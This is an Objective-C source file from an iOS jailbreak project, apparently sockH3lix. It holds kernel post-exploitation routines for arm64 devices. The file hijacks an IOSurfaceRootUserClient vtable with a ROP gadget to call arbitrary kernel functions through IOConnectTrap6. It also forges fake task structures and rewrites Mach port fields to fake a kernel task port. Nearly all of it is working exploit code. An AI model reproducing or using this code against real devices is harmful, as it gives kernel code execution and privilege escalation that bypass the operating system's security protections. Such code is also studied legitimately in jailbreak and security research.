//
//  kutil.m
//  sockH3lix
//
//  Created by SXX on 2020/7/25.
//  Copyright © 2020 tihmstar. All rights reserved.
//
#include <stdio.h>
#include <stdint.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include "common.h"
#include "offsets.h"
#import <Foundation/Foundation.h>
#include "kutil.h"
#include "jailbreak.h"
#include "kernel_memory.h"
#include "sock_port_exploit.h"
#include <pthread.h>

// Only support arm64 devices, not arm64e devices.

static mach_port_t prepare_user_client() {
    kern_return_t err;
    mach_port_t user_client;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == 0) {
        LOG("unable to find service");
        exit(EXIT_FAILURE);
    }

    err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS) {
        LOG("unable to get user client connection");
        exit(EXIT_FAILURE);
    }

    return user_client;
}

static mach_port_t user_client;
static kptr_t IOSurfaceRootUserClient_port;
static kptr_t IOSurfaceRootUserClient_addr;
static kptr_t fake_vtable;
static kptr_t fake_client;
static const int fake_kalloc_size = 0x1000;

static pthread_mutex_t kexec_lock;

bool init_kexec() {
    puts("kexec: preparing user client");
    user_client = prepare_user_client();
    if (!MACH_PORT_VALID(user_client)) {
        return false;
    }
    puts("kexec: getting user client port address");
    IOSurfaceRootUserClient_port = get_address_of_port(proc_struct_addr(), user_client);
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) {
        return false;
    }
    puts("kexec: getting user client port ptr");
    IOSurfaceRootUserClient_addr = kread_uintptr(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) {
        return false;
    }
    puts("kexec: getting vtab ptr");
    kptr_t IOSurfaceRootUserClient_vtab = kread_uintptr(IOSurfaceRootUserClient_addr);
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) {
        return false;
    }
    puts("kexec: allocating fake vtable");
    fake_vtable = kmem_alloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_vtable)) {
        return false;
    }
    
    size_t buffer_size = fake_kalloc_size;
    void *buffer = malloc(fake_kalloc_size);
    puts("kexec: copying vtable");
    kread(IOSurfaceRootUserClient_vtab, buffer, buffer_size);
    kwrite(fake_vtable, buffer, buffer_size);
    puts("kexec: allocating fake client");
    fake_client = kmem_alloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_client)) {
        return false;
    }
    puts("kexec: copying fake client");
    kread(IOSurfaceRootUserClient_addr, buffer, 0x50);
    kwrite(fake_client, buffer, 0x50);
    puts("kexec: overwriting user client");
    kwrite_uintptr(fake_client, fake_vtable);
    kwrite_uintptr(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
    
    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    puts("kexec: setting ROP");
#if __arm64__
    kwrite_uint64(fake_vtable + 8 * 0xB7, get_add_x0_x0_0x40_ret());
#else
    kwrite_uint32(fake_vtable + 4 * get_vtab_get_external_trap_for_index(), get_add_x0_x0_0x40_ret() + 1);
#endif
    pthread_mutex_init(&kexec_lock, NULL);
    free(buffer);
    return true;
}

void term_kexec() {
    kwrite_uint64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
    kmem_free(fake_vtable, fake_kalloc_size);
    kmem_free(fake_client, fake_kalloc_size);
    IOServiceClose(user_client);
    pthread_mutex_destroy(&kexec_lock);
}

kptr_t kexec(kptr_t ptr, kptr_t x0, kptr_t x1, kptr_t x2, kptr_t x3, kptr_t x4, kptr_t x5, kptr_t x6) {
    kptr_t returnval = 0;
    pthread_mutex_lock(&kexec_lock);
    const uintptr_t offset = 0x40;
    kptr_t off0 = kread_uintptr(fake_client + offset);
    kptr_t off1 = kread_uintptr(fake_client + (offset + sizeof(kptr_t)));
#if !__arm64__
    kptr_t off2 = kread_uintptr(fake_client + (offset + 2 * sizeof(kptr_t)));
#endif
    kwrite_uintptr(fake_client + offset, x0);
    kwrite_uintptr(fake_client + (offset + sizeof(kptr_t)), ptr);
#if !__arm64__
    kwrite_uintptr(fake_client + (offset + 2 * sizeof(kptr_t)), 0);
    //printf("kexec "ADDR" "ADDR" "ADDR" "ADDR" "ADDR" "ADDR" "ADDR" "ADDR"\n", ptr, x0, x1, x2, x3, x4, x5, x6);
    returnval = IOConnectTrap6(user_client, fake_client + offset, x1, x2, x3, x4, x5, x6);
#else
    returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
#endif
    kwrite_uintptr(fake_client + offset, off0);
    kwrite_uintptr(fake_client + (offset + sizeof(kptr_t)), off1);
#if !__arm64__
    kwrite_uintptr(fake_client + (offset + 2 * sizeof(kptr_t)), off2);
#endif
    pthread_mutex_unlock(&kexec_lock);
    return returnval;
}

#define SafeFreeNULL(X) free(X)
#define _assert(X) if (!(X)) {printf("assert failed\n");;goto out;}
#if __arm64__
static kptr_t
zm_fix_addr(kptr_t addr) {
    typedef struct {
        uintptr_t prev;
        uintptr_t next;
        uintptr_t start;
        uintptr_t end;
    } kmap_hdr_t;
    kptr_t zm_fixed_addr = 0;
    kmap_hdr_t *zm_hdr = NULL;
    kptr_t const symbol = get_zone_map_ref();//getoffset(zone_map_ref);
    _assert(KERN_POINTER_VALID(symbol));
    zm_hdr = malloc(sizeof(kmap_hdr_t));
    _assert(zm_hdr != NULL);
    kptr_t const zone_map = kread_uintptr(symbol);
    _assert(KERN_POINTER_VALID(zone_map));
    _assert(rkbuffer(zone_map + 0x10, zm_hdr, sizeof(kmap_hdr_t)));
    _assert(zm_hdr->end - zm_hdr->start <= 0x100000000);
    kptr_t const zm_tmp = (zm_hdr->start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    zm_fixed_addr = zm_tmp < zm_hdr->start ? zm_tmp + 0x100000000 : zm_tmp;
out:;
    SafeFreeNULL(zm_hdr);
    return zm_fixed_addr;
}

kptr_t IOMalloc(vm_size_t size) {
    kptr_t ret = 0;
    kptr_t const function = get_IOMalloc();//getoffset(IOMalloc);
    _assert(KERN_POINTER_VALID(function));
    ret = kexec(function, (kptr_t)size, 0, 0, 0, 0, 0, 0);
    if (ret != 0) ret = zm_fix_addr(ret);
out:;
    return ret;
}
#endif

void IOFree(kptr_t address, vm_size_t size) {
    _assert(KERN_POINTER_VALID(address));
    _assert(size > 0);
    kptr_t const function = get_IOFree();//getoffset(IOFree);
    _assert(KERN_POINTER_VALID(function));
    kexec(function, address, (kptr_t)size, 0, 0, 0, 0, 0);
out:;
}

kptr_t make_fake_task(kptr_t vm_map) {
    kptr_t ret = 0;
    kptr_t fake_task_kaddr = 0;
    void *fake_task = NULL;
    if (!KERN_POINTER_VALID(vm_map)) {
        goto out;
    }
    fake_task_kaddr = kmem_alloc(fake_task_size);
    if (!KERN_POINTER_VALID(fake_task_kaddr)) {
        goto out;
    }
    fake_task = malloc(fake_task_size);
    if (fake_task == NULL) {
        goto out;
    }
    memset(fake_task, 0, fake_task_size);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d;
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    _assert(wkbuffer(fake_task_kaddr, fake_task, fake_task_size));
    ret = fake_task_kaddr;
out:;
    if (!KERN_POINTER_VALID(ret) && KERN_POINTER_VALID(fake_task_kaddr)) {
        kmem_free(fake_task_kaddr, fake_task_size);
    }
    free(fake_task);
    return ret;
}

void
free_fake_task(kptr_t fake_task) {
    kmem_free(fake_task, fake_task_size);
}

#define find_port(port, disposition) ( get_address_of_port(proc_struct_addr(), port))

kptr_t ipc_space_kernel() {
    kptr_t ret = 0;
    kptr_t const task_self = task_self_addr();
    _assert(KERN_POINTER_VALID(task_self));
    kptr_t const ipc_space = kread_uintptr(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    _assert(KERN_POINTER_VALID(ipc_space));
    ret = ipc_space;
out:;
    return ret;
}

#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
#define IO_BITS_ACTIVE      0x80000000

#define IKOT_TASK               2

static bool
convert_port_to_task_port(mach_port_t port, kptr_t space, kptr_t task_kaddr, struct port_kernel_context *save) {
    bool ret = false;
    _assert(MACH_PORT_VALID(port));
    _assert(KERN_POINTER_VALID(space));
    _assert(KERN_POINTER_VALID(task_kaddr));
    kptr_t const port_kaddr = get_address_of_port(proc_struct_addr(), port);
    if (save != NULL) {
        //kread(port_kaddr, (void*)&save->port, sizeof(save->port));
        save->io_bits = kread_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
        save->io_references = kread_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES));
        save->ip_srights = kread_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS));
        save->ip_receiver = kread_uintptr(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
        save->ip_kobject = kread_uintptr(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    }
    _assert(KERN_POINTER_VALID(port_kaddr));
    _assert(kwrite_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK));
    _assert(kwrite_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d));
    _assert(kwrite_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d));
    _assert(kwrite_uintptr(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space));
    _assert(kwrite_uintptr(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr));
    kptr_t const task_port_addr = task_self_addr();
    _assert(KERN_POINTER_VALID(task_port_addr));
    kptr_t const task_addr = kread_uintptr(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    _assert(KERN_POINTER_VALID(task_addr));
    kptr_t const itk_space = kread_uintptr(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    _assert(KERN_POINTER_VALID(itk_space));
    kptr_t const is_table = kread_uintptr(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    _assert(KERN_POINTER_VALID(is_table));
    uint32_t bits = kread_uint32(is_table + (MACH_PORT_INDEX(port) * koffset(KSTRUCT_SIZE_IPC_ENTRY)) + koffset(KSTRUCT_OFFSET_IPC_ENTRY_IE_BITS));
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    _assert(kwrite_uint32(is_table + (MACH_PORT_INDEX(port) * koffset(KSTRUCT_SIZE_IPC_ENTRY)) + koffset(KSTRUCT_OFFSET_IPC_ENTRY_IE_BITS), bits));
    ret = true;
out:;
    return ret;
}

void
restore_port(mach_port_t port, struct port_kernel_context *save) {
    kptr_t const port_kaddr = get_address_of_port(proc_struct_addr(), port);
    
    _assert(kwrite_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), save->io_bits));
    _assert(kwrite_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), save->io_references));
    _assert(kwrite_uint32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), save->ip_srights));
    _assert(kwrite_uintptr(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), save->ip_receiver));
    _assert(kwrite_uintptr(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  save->ip_kobject));
    
out:;
}

bool
make_port_fake_task_port(mach_port_t port, kptr_t task_kaddr, struct port_kernel_context *save) {
    bool ret = false;
    _assert(MACH_PORT_VALID(port));
    _assert(KERN_POINTER_VALID(task_kaddr));
    kptr_t const space = ipc_space_kernel();
    _assert(KERN_POINTER_VALID(space));
    _assert(convert_port_to_task_port(port, space, task_kaddr, save));
    ret = true;
out:;
    return ret;
}

extern kptr_t self_proc_addr;

kptr_t proc_struct_addr() {
    return self_proc_addr;
}

kptr_t get_address_of_port(kptr_t proc, mach_port_t port) {
    kptr_t task_addr = 0;
    kread(proc + koffset(KSTRUCT_OFFSET_PROC_TASK), &task_addr, sizeof(task_addr));
    if (!KERN_POINTER_VALID(task_addr)) {
        return 0;
    }
    kptr_t itk_space = 0;
    kread(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE), &itk_space, sizeof(task_addr));
    if (!KERN_POINTER_VALID(itk_space)) {
        return 0;
    }
    kptr_t is_table = 0;
    kread(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE), &is_table, sizeof(is_table));
    if (!KERN_POINTER_VALID(is_table)) {
        return 0;
    }
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = koffset(KSTRUCT_SIZE_IPC_ENTRY);
    
    kptr_t port_addr = 0;
    kread(is_table + (port_index * sizeof_ipc_entry_t), &port_addr, sizeof(port_addr));
    if (!KERN_POINTER_VALID(port_addr)) {
        return 0;
    }
    return port_addr;
}
